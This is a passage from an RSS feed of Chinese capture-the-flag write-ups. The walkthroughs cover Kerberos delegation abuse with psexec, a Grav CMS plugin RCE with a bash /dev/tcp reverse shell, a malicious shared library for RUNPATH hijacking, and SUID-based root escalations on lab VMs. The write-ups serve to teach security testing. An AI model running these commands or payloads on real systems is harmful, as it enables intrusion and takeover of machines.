   └─$ export KRB5CCNAME=NEWPC$.ccache
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -k -no-pass -spn cifs/dc.novice.com -impersonate Administrator -dc-ip 192.168.205.132 novice.com/NEWPC$       
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Impersonating Administrator
   [*] Requesting S4U2self
   [*] Requesting S4U2Proxy
   [*] Saving ticket in Administrator@cifs_dc.novice.com@NOVICE.COM.ccache
   ```

   攻击成功，我们获取了包含管理员权限的服务票据，并保存在一个新的 `.ccache` 凭证缓存文件中。

---

# **四、夺取域控与总结**

## **4.1 解决名称解析问题**

在直接使用最终票据进行攻击时，我们的攻击机可能因为无法将域名 `dc.novice.com` 和 `novice.com` 解析到正确的IP地址而导致连接失败。为了避免这个问题，需要将域名和IP的对应关系手动写入本地的 `/etc/hosts` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo nano /etc/hosts
[sudo] kali 的密码：
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts                                  
192.168.205.132 novice.com dc.novice.com DC
```

添加此条目后，所有相关的域名都将正确指向目标IP。

## **4.2 最终攻击**

1. **加载最终票据**
   首先，更新 `KRB5CCNAME` 环境变量，使其指向刚刚获取的、包含管理员权限的新票据文件。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ export KRB5CCNAME=Administrator@cifs_dc.novice.com@NOVICE.COM.ccache
   ```

2. **执行 `psexec.py` 获取SYSTEM权限**
   最后，使用 `psexec.py` 和已加载的管理员票据，在域控制器上执行命令。该工具将利用票据进行认证，并在目标上创建一个服务来反弹一个交互式Shell。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass dc.novice.com
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Requesting shares on dc.novice.com.....
   [*] Found writable share ADMIN$
   [*] Uploading file ACAXTjTE.exe
   [*] Opening SVCManager on dc.novice.com.....
   [*] Creating service ELXu on dc.novice.com.....
   [*] Starting service ELXu.....
   [!] Press help for extra shell commands
   [-] Decoding error detected, consider running chcp.com at the target,
   map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
   and then execute smbexec.py again with -codec and the corresponding codec
   Microsoft Windows [�汾 10.0.20348.169]
   
   [-] Decoding error detected, consider running chcp.com at the target,
   map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
   and then execute smbexec.py again with -codec and the corresponding codec
   (c) Microsoft Corporation����������Ȩ����
   
   C:\Windows\system32&gt; whoami
   nt authority\system
   ```

`whoami` 命令的返回结果确认为 `nt authority\system`，这表明我们已成功获得域控制器的最高系统权限。至此，本次渗透测试圆满完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_novice-admin.html</guid><pubDate>Sat, 23 Aug 2025 04:10:08 +0000</pubDate></item><item><title>内部_Grav</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Grav.html</link><description># **一、信息收集**

首先，在目标网段内使用`arp-scan`进行主机发现，确定目标主机的IP地址。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
...
192.168.205.150 08:00:27:3c:ed:e0       PCS Systemtechnik GmbH
...
```

发现目标主机IP为 `192.168.205.150`。接着，使用`nmap`对该主机进行全端口扫描，以探测其开放的服务。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.150
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:3C:ED:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示，目标主机开放了22端口（SSH）和80端口（HTTP）。

# **二、漏洞扫描与利用**

访问80端口提供的Web服务，发现是一个产品介绍页面，没有太多可交互的功能。因此，使用`gobuster`进行目录扫描，以发现隐藏的路径或文件。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.150 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/index.html           (Status: 200) [Size: 12350]
/grav                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.150/grav/]
...
```

扫描发现了一个重要的目录 `/grav`。访问 `http://192.168.205.150/grav/`，识别出该站点是基于 Grav CMS 构建的。

在浏览网页内容时，于`typography`页面发现了一组疑似后台凭据的字符串：`Grav Admin:Admin@123`。

![image-20250818165349274](http://7r1UMPHK.github.io/image/20250821190836487.webp)

使用用户名 `admin` 和密码 `Admin@123` 尝试登录后台地址 `http://192.168.205.150/grav/admin`，成功进入管理面板。

登录后台后，计划通过安装恶意的插件来获取服务器的Shell。这里利用一个已知的插件漏洞（CVE-2025-50286），通过后台的“直接安装”功能上传一个包含后门的插件压缩包 `grav-plugin-simple_form-develop.zip`。

&gt; [!Tip]
&gt;
&gt; 那个插件利用的模板：https://github.com/binneko/CVE-2025-50286
&gt;
&gt; 但是他这个是使用不了的（改改能用？），建议去我们群的discord，看Sublarge发的那个
&gt;
&gt; ![image-20250818165621326](http://7r1UMPHK.github.io/image/20250821190812199.webp)

![image-20250818170620504](http://7r1UMPHK.github.io/image/20250821190814531.webp)

插件安装并激活后，在Kali上启动`netcat`监听8888端口。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

接着，通过`curl`发送一个精心构造的GET请求来触发插件中的漏洞，执行反向Shell命令。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl --get --data-urlencode 'cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'' http://192.168.205.150/grav/
```

监听端成功接收到反弹Shell，当前用户为`www-data`。

```shell
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.150] 55952
bash: cannot set terminal process group (404): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Grav:/var/www/html/grav$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# **三、权限提升**

为了便于后续操作，首先利用`script`命令将当前的Shell升级为功能更完整的交互式TTY。

```shell
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

在服务器上进行信息收集，发现在`/home/grav`目录下存在一个提示文件`.hint`。

```shell
www-data@Grav:/home/grav$ ls -al
...
-rw-r-xr--+ 1 root root   21 Aug 16 06:56 .hint
-rw-r-x---+ 1 grav grav   44 Aug 16 07:05 user.txt
www-data@Grav:/home/grav$ cat .hint
do you know RUNPATH?
```

提示信息提到了`RUNPATH`，这是一种在ELF文件中指定的运行时库搜索路径。它具有比`LD_PRELOAD`和`LD_LIBRARY_PATH`更高的优先级，如果配置不当可能导致库劫持漏洞。

根据提示，开始寻找具有SUID权限的二进制文件，这些文件是提权的常见入口点。

```shell
www-data@Grav:/var/www/html/grav$ find / -perm -4000 -type f -exec ls -l {} \; 2&gt;/dev/null
...
-rwsr-xr-x 1 root root 17536 Aug 17 02:35 /usr/local/bin/usermgr
...
```

发现一个可疑的SUID文件 `/usr/local/bin/usermgr`。使用`readelf`检查其动态链接信息，确认其`RUNPATH`被设置为当前目录 `.`。

```shell
www-data@Grav:/home/grav$ readelf -d /usr/local/bin/usermgr | grep RUNPATH
 0x000000000000001d (RUNPATH)            Library runpath: [.]
```

接着，使用`ldd`查看该程序依赖的动态链接库。

```shell
www-data@Grav:/home/grav$ ldd /usr/local/bin/usermgr
        linux-vdso.so.1 (0x00007ffdbeac0000)
        libauth.so =&gt; /lib/libauth.so (0x00007fa27b1ff000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa27b02b000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa27b214000)
```

`usermgr`依赖一个名为`libauth.so`的库。由于`RUNPATH`被设置为 `.`，这意味着当执行`/usr/local/bin/usermgr`时，系统会首先在当前工作目录下查找`libauth.so`。这为我们实施库劫持提供了条件。

切换到具有写权限的目录`/tmp`，并编写一个恶意的C源文件`a.c`。该文件利用GCC的`__attribute__((constructor))`特性，在库被加载时自动执行代码，以root权限生成一个bash shell。

```c
// a.c
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

void __attribute__((constructor)) run_on_load() {
    setuid(0);
    setgid(0);
    char *args[] = {'/bin/bash', NULL};
    execve('/bin/bash', args, NULL);
}
```

将该C文件编译为名为`libauth.so`的共享库。

```shell
www-data@Grav:/tmp$ gcc -shared -fPIC -o libauth.so a.c
```

最后，在`/tmp`目录下执行`/usr/local/bin/usermgr`。由于`RUNPATH`的设置，程序会加载我们放在`/tmp`下的恶意`libauth.so`，从而执行其中的提权代码。

```shell
www-data@Grav:/tmp$ /usr/local/bin/usermgr
root@Grav:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

成功获取root权限。现在可以读取所有的flag文件。

```shell
root@Grav:/tmp# cat /root/root.txt /home/grav/user.txt
flag{root-67f2a835697e7c9c2c5146c76eca6038}
flag{user-ab72ef6c613b6a51db91eedd34271143}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Grav.html</guid><pubDate>Thu, 21 Aug 2025 11:09:12 +0000</pubDate></item><item><title>内部_Chat2</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Chat2.html</link><description># **一、信息收集**

首先，在与目标网络相同的网段下，使用 `arp-scan` 工具对C段进行扫描，以发现内网中的存活主机。

```shell
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.153 08:00:27:44:e8:4a       (Unknown)
...
```

发现目标主机IP为 `192.168.205.153`。接下来，使用 `nmap` 对该主机进行全端口扫描，以探测其开放的服务。

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p0-65535 192.168.205.153
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 10:02 EDT
Nmap scan report for 192.168.205.153
Host is up (0.00010s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:44:E8:4A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示，目标主机开放了22端口（SSH服务）和80端口（HTTP服务）。

# **二、漏洞利用**

## **1. Web信息泄露**

我们首先从80端口的Web服务入手。访问 `http://192.168.205.153`，发现是一个Discuz!论坛。在“在线会员”模块中，我们注意到了一个名为 `admin` 的管理员用户。此外，在默认版块中发现了一篇标题为“Let's Encrypt”的文章。

![image-20250820220528034](http://7r1UMPHK.github.io/image/20250821102639273.webp)

查看文章内容，发现是一段摩斯密码：

```
.--. .- ... ... .-- --- .-. -.. .---- ..--- ...--
```

使用在线摩斯密码解码工具，得到解码结果：

```
PASSWORD123
```

&gt; **注意**：摩斯密码本身不区分字母大小写，因此在实际爆破或登录尝试时，需要考虑所有可能的大小写组合，如 `password123`, `Password123`, `PASSWORD123` 等。

## **2. 获取Web后台权限**

我们当前只知道管理员用户名为 `admin`，但没有SSH的用户名，因此首先尝试登录Discuz!的Web后台。

使用用户名 `admin` 和刚刚解码出的密码 `password123` 进行登录，成功进入论坛。

![image-20250820220813966](http://7r1UMPHK.github.io/image/20250821102705225.webp)

在用户界面中，我们找到了“管理中心”的入口，这正是我们感兴趣的地方。点击进入时，系统要求再次验证密码，我们输入 `password123` 后成功进入后台。

## **3. 正向Shell**

在后台首页，我们注意到该Discuz! 的版本为 3.5 (20250205)，这是一个较新的版本。经过初步搜索，并未发现该版本存在已知的远程代码执行（RCE）漏洞。

于是，我们开始探索后台的各项功能。在 **工具 &gt; 计划任务** 中，发现一个名为 `shell.php` 的自定义任务。

![image-20250820221119024](http://7r1UMPHK.github.io/image/20250821102637022.webp)

尝试编辑该任务，发现其执行的脚本 `shell.php` 是写死的，无法直接修改其内容。根据命名推测，这可能是一个预留的WebShell或者一个用于建立连接的脚本。我们无法修改脚本，但可以控制其执行时间。

我们将执行周期的“每周”字段改为 `*` (代表每天)，并将“分钟”字段修改为当前时间的下一分钟（例如，当前是10:12，就设置为13）。

![image-20250820221256884](http://7r1UMPHK.github.io/image/20250821102637186.webp)

&gt; **知识点补充**：这是一种利用计划任务获取Shell的常见手法。这里的 `shell.php` 极有可能是一个正向Shell脚本，它会在被访问或执行时，监听服务器的某个端口，等待攻击者连接。

到达设定的时间点（xx:13）后，我们再次使用 `nmap` 扫描目标主机的端口。

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p0-65535 192.168.205.153
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
12345/tcp open  netbus
...
```

扫描结果显示，目标主机多开放了一个 `12345` 端口。我们尝试使用 `netcat (nc)` 连接该端口。

```shell
┌──(kali㉿kali)-[~]
└─$ nc 192.168.205.153 12345
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功连接，并且执行 `id` 命令后得到了回显。这是一个 `www-data` 用户权限的正向Shell。为了便于后续操作，我们使用以下命令将其升级为一个稳定的交互式Shell。

```shell
script /dev/null -c bash
# 按下 Ctrl+Z 将其挂起
stty raw -echo; fg
# 按下回车
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **三、横向移动**

## **1. 数据库凭据发现**

当前我们是 `www-data` 用户，权限较低。首先，我们在系统中进行信息收集，寻找可以横向移动到其他用户的线索。在 `/home` 目录下，发现了一个名为 `discuz` 的用户。

```shell
www-data@Chat2:/var/www/html$ cd /home/
www-data@Chat2:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Aug  3 09:28 .
drwxr-xr-x 18 root   root   4096 Mar 18 20:37 ..
drwxr-xr-x  2 discuz discuz 4096 Aug  3 09:46 discuz
```

由于这是一个CMS应用，数据库配置文件通常包含了高权限的数据库用户凭据。我们在网站根目录 `/var/www/html/config/` 下找到了配置文件 `config_global.php`。

```shell
www-data@Chat2:/var/www/html/config$ cat config_global.php
...
$_config['db'][1]['dbhost'] = '127.0.0.1';
$_config['db'][1]['dbuser'] = 'discuz_user';
$_config['db'][1]['dbpw'] = 'StrongPassword!123';
...
```

## **2. 数据库信息挖掘**

我们找到了数据库用户 `discuz_user` 和密码 `StrongPassword!123`。使用该凭据连接本地的MariaDB数据库。

```shell
www-data@Chat2:/var/www/html/config$ mysql -u discuz_user -p'StrongPassword!123'
...
MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| discuz_db          |
| information_schema |
| mysql              |
+--------------------+
```

在 `discuz_db` 数据库的 `maze_ucenter_members` 表中，我们只发现了之前登录Web后台的admin用户哈希，这对横向移动没有帮助。

于是，我们将目光转向了 `mysql` 这个系统数据库，它存储了数据库的所有用户信息。

```shell
MariaDB [discuz_db]&gt; use mysql;
Database changed
MariaDB [mysql]&gt; select user, host, password from user;
...
```

查询 `user` 表后，除了已知的 `discuz_user`，我们还发现了一个名为 `hackme` 的用户，其密码哈希为 `FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2`。这是一个MySQL 4.1版本之前的旧格式哈希（`mysql_old_password`）。

我们使用在线哈希破解网站（如 crackstation.net）对此哈希进行查询，成功破解出明文密码为 `root123`。

## **3. 切换用户**

我们猜测 `hackme` 用户的密码可能与系统用户 `discuz` 的密码相同。尝试使用 `su` 命令切换到 `discuz` 用户，并输入密码 `root123`。

```shell
www-data@Chat2:/var/www/html/config$ su discuz
Password: root123
discuz@Chat2:/home$ id
uid=1000(discuz) gid=1000(discuz) groups=1000(discuz)
```

成功切换！我们已经从 `www-data` 用户横向移动到了 `discuz` 用户。

# **四、权限提升**

## **1. SUID提权向量与文件属性**

登录 `discuz` 用户后，我们首先检查该用户拥有的 `sudo` 权限，同时开始寻找系统上其他的提权向量，例如查找具有SUID权限位的二进制文件。

```shell
# 检查sudo权限
discuz@Chat2:~$ sudo -l
...
User discuz may run the following commands on Chat2:
    (ALL) NOPASSWD: /home/discuz/chat

# 查找系统范围内的SUID文件
discuz@Chat2:~$ find / -perm -4000 -type f -exec ls -l {} \; 2&gt;/dev/null
...
-rwsr-sr-x 1 root root 14336 Jan  9  2020 /usr/bin/chattr
...
```

我们得到了两条关键信息：

1.  `discuz` 用户可以无密码以root权限执行其家目录下的 `chat` 程序。这是一个非常直接的提权路径。
2.  `/usr/bin/chattr` 命令被设置了SUID位。

&gt; **知识点补充**：SUID（Set User ID）是一种特殊的权限位。当一个可执行文件设置了SUID位后，任何用户在执行它时，进程的有效用户ID（euid）都会变成文件所有者的ID。`chattr` 的所有者是root，因此我们现在可以以root权限来执行 `chattr` 命令。

我们的主要攻击思路是替换 `/home/discuz/chat` 文件为一个恶意脚本，然后通过 `sudo` 执行它来提权。然而，当我们尝试重命名或删除该文件时，却遭到了拒绝。

```shell
discuz@Chat2:~$ mv chat chat.bak
mv: cannot move 'chat' to 'chat.bak': Operation not permitted
```

这个现象很不寻常，因为我们作为 `discuz` 用户，对自己家目录下的文件应该有写权限。这通常意味着文件被设置了特殊的扩展属性。我们使用 `lsattr` 命令来验证猜想。

```shell
discuz@Chat2:~$ lsattr /home/discuz/chat
----i---------e---- /home/discuz/chat
```

&gt; **知识点补充**：`lsattr` 命令用于查看文件的扩展属性。这里的 `i` 属性（immutable）意味着该文件被“锁定”，即便是root用户也无法修改、删除、重命名或创建链接。

现在，两条线索完美地结合在了一起：`chat` 文件因为 `i` 属性而无法被修改，而我们恰好拥有一个带SUID的 `chattr` 命令，可以用它来移除这个 `i` 属性。

## **2. 替换文件并提权**

提权思路已经清晰：

1.  利用带SUID的 `/usr/bin/chattr` 移除 `/home/discuz/chat` 的 `i` 属性。
2.  将 `/home/discuz/chat` 替换为我们自己的恶意脚本。
3.  通过 `sudo` 执行修改后的 `chat` 脚本，以root权限完成提权。

我们构造的恶意脚本功能是为 `/bin/bash` 添加SUID权限位，这样我们就能随时通过 `bash -p` 获取一个root shell。

执行以下命令：

```shell
# 1. 利用SUID chattr移除 i 属性
discuz@Chat2:~$ /usr/bin/chattr -i /home/discuz/chat

# 2. 备份原文件并创建恶意脚本
discuz@Chat2:~$ mv chat chat.bak
discuz@Chat2:~$ echo 'chmod +s /bin/bash' &gt; chat
discuz@Chat2:~$ chmod +x chat

# 3. 检查 /bin/bash 当前权限
discuz@Chat2:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash

# 4. 使用sudo执行我们的脚本
discuz@Chat2:~$ sudo /home/discuz/chat

# 5. 再次检查 /bin/bash 权限，确认SUID位已添加
discuz@Chat2:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

可以看到 `/bin/bash` 已经拥有了 `rws` 权限，SUID位设置成功。

## **3. 获取Root Shell**

最后，执行 `bash -p` 命令，利用SUID权限获得一个 euid 为 0 (root) 的shell。

```shell
discuz@Chat2:~$ bash -p
bash-5.0# id
uid=1000(discuz) gid=1000(discuz) euid=0(root) egid=0(root) groups=0(root),1000(discuz)
```

&gt; **知识点补充**：`bash -p` 中的 `-p` 参数告诉bash不要将有效用户ID（euid）重置为实际用户ID（uid）。如果一个可执行文件（如bash）设置了SUID位，普通用户执行它时，进程的euid会变成文件所有者（root）的ID。`-p` 参数保留了这个提权后的euid，从而让我们获得root权限的shell。

# **五、夺取凭证**

成功获取root权限后，我们读取位于用户目录和root目录下的flag文件。

```shell
bash-5.0# cat /home/discuz/user.txt /root/root.txt
flag{user-41352be6a84e5910fdef6afec4e41617}
flag{root-099177104a7291ba00f83ab188987c5d}
```

成功获取所有flag，渗透测试结束。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Chat2.html</guid><pubDate>Thu, 21 Aug 2025 02:27:36 +0000</pubDate></item><item><title>hmv_Lazzycorp</title><link>https://7r1UMPHK.github.io/post/hmv_Lazzycorp.html</link><description># **一、信息收集**

## **主机发现**

首先，在当前网段内进行主机发现，以确定目标靶机的IP地址。这里我们使用`arp-scan`工具。

```shell
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.149 08:00:27:ea:8b:bc       (Unknown)
...
```

扫描结果表明，目标主机的IP地址为 `192.168.205.149`。

## **端口扫描**

确认目标IP后，使用`nmap`进行全端口扫描，以识别目标主机上开放的服务。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:26 EDT
Nmap scan report for 192.168.205.149
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:8B:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

扫描发现开放了三个关键端口：21 (FTP), 22 (SSH), 和 80 (HTTP)。

## **FTP服务探测**

FTP服务通常可能存在匿名访问漏洞。尝试使用`anonymous`作为用户名和密码进行登录。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ lftp 192.168.205.149 -u anonymous
密码: anonymous
lftp anonymous@192.168.205.149:~&gt; ls -al
...
drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
lftp anonymous@192.168.205.149:/&gt; cd pub/
lftp anonymous@192.168.205.149:/pub&gt; ls -al
...
-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg
lftp anonymous@192.168.205.149:/pub&gt; get note.jpg
1366786 bytes transferred
```

成功登录并发现 `/pub` 目录下有一个名为 `note.jpg` 的文件，将其下载到本地。

## **Web目录扫描**

在分析FTP文件的同时，对Web服务进行目录扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dirsearch -u http://192.168.205.149/
...
[10:29:21] 301 -  317B  - /blog  -&gt;  http://192.168.205.149/blog/
[10:29:32] 200 -   55B  - /robots.txt
[10:29:36] 301 -  320B  - /uploads  -&gt;  http://192.168.205.149/uploads/
...
```

首先查看 `robots.txt` 文件，它通常会泄露一些后台路径。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.149/robots.txt
Disallow: /cms-admin.php
Disallow: /auth-LazyCorp-dev/
```

`robots.txt` 文件泄露了两个路径。值得注意的是，Linux系统上的Web服务器路径通常是大小写敏感的。尝试访问 `robots.txt` 中给出的 `/auth-LazyCorp-dev/`（首字母大写）返回404 Not Found，但尝试其小写版本 `/auth-lazycorp-dev/` 时，服务器返回了 `403 Forbidden` 错误。这个 `403` 错误码表明该目录确实存在，只是我们没有权限直接访问或列出其内容。

这个发现至关重要，它为我们指明了下一步的方向：对这个已确认存在的 `/auth-lazycorp-dev/` 目录进行深度爆破，以发现其中隐藏的可访问文件。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.149/auth-lazycorp-dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
...
/login.php            (Status: 200) [Size: 710]
/uploads              (Status: 301) [Size: 338] [--&gt; http://192.168.205.149/auth-lazycorp-dev/uploads/]
/dashboard.php        (Status: 302) [Size: 0] [--&gt; login.php]
...
```

爆破成功，找到了登录页面 `login.php` 和文件上传目录 `uploads`。

同时，对Web服务的根目录进行扫描也发现了 `/blog` 目录，其中的文章包含重要线索：
1.  `DevLog #1`: 提到Arvind将凭证隐藏在一个图片文件中发送给了Dev。这与我们在FTP中发现的`note.jpg`文件相吻合。
2.  `DevLog #3`: 提到一个位于 `/usr/local/bin/` 下的重置脚本。这是后续提权的关键信息。

# **二、漏洞利用**

## **图片隐写术获取凭证**

`DevLog #1` 强烈暗示 `note.jpg` 文件中含有凭证。我们使用 `stegseek` 工具进行分析。`stegseek` 是一款高速的隐写破解工具，可以有效地检测和提取`steghide`隐藏的数据。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegseek note.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ''
[i] Original filename: 'creds.txt'.
[i] Extracting to 'note.jpg.out'.

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat note.jpg.out
Username: dev
Password: d3v3l0pm3nt!nt3rn
```

成功从图片中提取出隐藏的凭证。

## **后台文件上传Getshell**

利用刚刚获取的凭证 `dev:d3v3l0pm3nt!nt3rn` 登录之前发现的后台地址 `http://192.168.205.149/auth-lazycorp-dev/login.php`。

登录后，发现一个文件上传功能。结合之前爆破出的 `/uploads` 目录，我们可以上传一个PHP反向shell来获取服务器的控制权。

1.  在本地准备一个PHP反向shell（例如 `reverse.php`）。
2.  通过后台上传该文件。
3.  在Kali上使用 `netcat` 监听指定端口。
    ```shell
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
    └─$ nc -lvnp 8888
    ```
4.  访问上传后的shell文件 `http://192.168.205.149/auth-lazycorp-dev/uploads/reverse.php`，触发反弹。

```shell
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 37494
Linux arvindlazycorp 5.4.0-216-generic ...
...
www-data@arvindlazycorp:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功获取了一个 `www-data` 用户的shell。

# **三、权限提升**

## **横向移动：www-data -&gt; arvind**

获取初始shell后，首先进行信息收集。在 `/home/arvind/` 目录下，发现了一个 `.ssh` 目录，其中包含SSH私钥 `id_rsa`。

```shell
www-data@arvindlazycorp:/$ cd /home/arvind/.ssh
www-data@arvindlazycorp:/home/arvind/.ssh$ ls -al
total 20
drwxr-xr-x 2 arvind arvind 4096 Jul  9 07:37 .
drwxr-xr-x 5 arvind arvind 4096 Jul 16 12:49 ..
-rw------- 1 arvind arvind  747 Jul  9 07:47 authorized_keys
-rw-r--r-- 1 arvind arvind 3389 Jul  9 07:37 id_rsa
-rw-r--r-- 1 arvind arvind  747 Jul  9 07:37 id_rsa.pub
```

利用这个私钥，可以直接以 `arvind` 用户的身份登录SSH。

```shell
www-data@arvindlazycorp:/home/arvind/.ssh$ ssh arvind@127.0.0.1 -i id_rsa
...
Welcome to Ubuntu 20.04.6 LTS ...
arvind@arvindlazycorp:~$ id
uid=1000(arvind) gid=1000(arvind) groups=1000(arvind),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)
```

成功切换到 `arvind` 用户。

## **垂直提权：arvind -&gt; root**

在 `arvind` 的家目录中，发现了一个具有SUID权限的可执行文件 `reset`。

```shell
arvind@arvindlazycorp:~$ ls -al
...
-rwsr-xr-x 1 root   root   16744 Jul 16 12:22 reset
...
```

SUID是一种特殊的文件权限，它允许用户在执行该文件时，临时获得文件所有者（在这里是root）的权限。

使用 `strings` 命令分析该文件，查找其功能。

```shell
arvind@arvindlazycorp:~$ strings ./reset
...
/usr/bin/reset_site.sh
...
```

分析结果显示，该程序会调用 `/usr/bin/reset_site.sh` 脚本。检查该脚本的权限。

```shell
arvind@arvindlazycorp:~$ ls -la /usr/bin/reset_site.sh
-rwxrwxr-x 1 root arvind 254 Jul  9 10:26 /usr/bin/reset_site.sh
```

我们发现，当前用户 `arvind` 对这个脚本有写入权限。这是一个典型的SUID提权漏洞。我们可以通过修改该脚本内容，让 `reset` 程序在以root权限执行时，运行我们自定义的命令。

1.  将提权命令写入脚本，这里我们将为 `/bin/bash` 添加SUID位。
    ```shell
    arvind@arvindlazycorp:~$ echo 'chmod +s /bin/bash' &gt; /usr/bin/reset_site.sh
    ```
2.  执行SUID程序 `reset` 来触发我们写入的恶意命令。
    ```shell
    arvind@arvindlazycorp:~$ ./reset
    ```
3.  检查 `/bin/bash` 的权限，发现已成功设置SUID位。
    ```shell
    arvind@arvindlazycorp:~$ ls -al /bin/bash
    -rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
    ```
4.  使用 `-p` 参数运行 `bash`，以保留SUID赋予的有效用户ID（euid），从而获得root权限的shell。
    ```shell
    arvind@arvindlazycorp:~$ bash -p
    bash-5.0# id
    uid=1000(arvind) gid=1000(arvind) euid=0(root) egid=0(root) groups=...
    ```

成功提升至root权限。

# **四、获取Flag**

现在，我们拥有了系统的最高权限，可以读取所有flag文件。

```shell
bash-5.0# cat /root/root.txt /home/arvind/user.txt
FLAG{lazycorp_reset_exploit_worked}
FLAG{you_got_foothold_nice}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Lazzycorp.html</guid><pubDate>Tue, 19 Aug 2025 14:51:41 +0000</pubDate></item><item><title>thl_watchstore</title><link>https://7r1UMPHK.github.io/post/thl_watchstore.html</link><description># **一、信息收集**

## **1.1 主机发现**

首先，在当前网段中使用 `arp-scan` 进行主机发现，确定目标主机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l       
...
192.168.205.152 08:00:27:e0:02:1a       PCS Systemtechnik GmbH
...
```

扫描结果表明，目标主机的IP地址为 `192.168.205.152`。

## **1.2 端口扫描**

使用 `nmap` 对目标主机进行全端口扫描，以识别开放的端口和服务。

```bash
